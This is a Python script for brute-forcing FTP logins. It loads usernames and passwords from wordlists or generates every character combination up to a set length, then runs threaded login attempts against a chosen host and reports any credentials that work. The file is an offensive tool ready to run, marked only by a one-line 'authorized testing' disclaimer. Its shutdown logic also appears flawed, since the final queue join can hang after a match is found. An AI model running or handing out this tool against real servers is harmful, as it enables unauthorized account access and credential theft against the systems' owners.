#!/usr/bin/env python3
import ftplib
import argparse
import threading
import queue
import itertools
import string
from colorama import init, Fore, Style

init(autoreset=True)

# Shared queue for (user, password) pairs
cred_queue = queue.Queue()
found_event = threading.Event()


def connect_ftp(host, port, username, password, timeout=5):
    """Try one FTP login, return True if successful, else False."""
    try:
        with ftplib.FTP() as client:
            client.connect(host, port, timeout=timeout)
            client.login(username, password)
            return True
    except ftplib.error_perm:
        # Authentication failed
        return False
    except Exception:
        # Network / timeout / other error – treat as failure for brute‑force
        return False


def worker(host, port):
    """Thread worker that consumes credentials from the queue."""
    while not cred_queue.empty() and not found_event.is_set():
        try:
            user, pwd = cred_queue.get_nowait()
        except queue.Empty:
            break

        print(f"{Fore.YELLOW}[TRY]{Style.RESET_ALL} {user}:{pwd}")

        if connect_ftp(host, port, user, pwd):
            print(f"{Fore.GREEN}[FOUND]{Style.RESET_ALL} {user}:{pwd}")
            found_event.set()
        cred_queue.task_done()


def load_lines(path):
    """Read non‑empty, stripped lines from a file."""
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def generate_passwords(chars, min_len, max_len):
    """Yield passwords generated from chars for lengths in [min_len, max_len]."""
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(chars, repeat=length):
            yield "".join(combo)


def build_credential_list(args):
    users = []
    passwords = []

    # Users: from file or single username
    if args.users:
        users = load_lines(args.users)
    elif args.user:
        users = [args.user]
    else:
        raise SystemExit("You must provide either --user or --users")

    # Passwords: wordlist file or generated
    if args.wordlist:
        passwords = load_lines(args.wordlist)
    elif args.generate:
        chars = ""
        if args.lower:
            chars += string.ascii_lowercase
        if args.upper:
            chars += string.ascii_uppercase
        if args.digits:
            chars += string.digits
        if args.special:
            chars += "!@#$%^&*"

        if not chars:
            raise SystemExit("No character sets selected for generation")

        for pwd in generate_passwords(chars, args.min_len, args.max_len):
            passwords.append(pwd)
    else:
        raise SystemExit("You must provide either --wordlist or --generate with options")

    return users, passwords


def parse_args():
    parser = argparse.ArgumentParser(
        description="Advanced FTP brute‑force script (for authorized testing only)"
    )
    parser.add_argument("--host", required=True, help="Target FTP host/IP")
    parser.add_argument("--port", type=int, default=21, help="Target port (default 21)")

    # User options
    parser.add_argument("--user", help="Single username")
    parser.add_argument("--users", help="File containing usernames (one per line)")

    # Password options
    parser.add_argument("--wordlist", help="Password wordlist file")
    parser.add_argument(
        "--generate",
        action="store_true",
        help="Generate passwords instead of using a wordlist",
    )
    parser.add_argument("--min-len", type=int, default=1, help="Min length for generated passwords")
    parser.add_argument("--max-len", type=int, default=3, help="Max length for generated passwords")
    parser.add_argument("--lower", action="store_true", help="Use lowercase letters in generation")
    parser.add_argument("--upper", action="store_true", help="Use uppercase letters in generation")
    parser.add_argument("--digits", action="store_true", help="Use digits in generation")
    parser.add_argument("--special", action="store_true", help="Use simple special chars in generation")

    parser.add_argument(
        "-t", "--threads", type=int, default=4, help="Number of worker threads"
    )
    return parser.parse_args()


def main():
    args = parse_args()

    users, passwords = build_credential_list(args)

    print(f"{Fore.CYAN}[*] Target: {args.host}:{args.port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Users: {len(users)}, Passwords: {len(passwords)}{Style.RESET_ALL}")

    # Fill queue
    for u in users:
        for p in passwords:
            cred_queue.put((u, p))

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.host, args.port), daemon=True)
        t.start()
        threads.append(t)

    cred_queue.join()

    if not found_event.is_set():
        print(f"{Fore.RED}[!] No valid credentials found{Style.RESET_ALL}")


if __name__ == "__main__":
    main()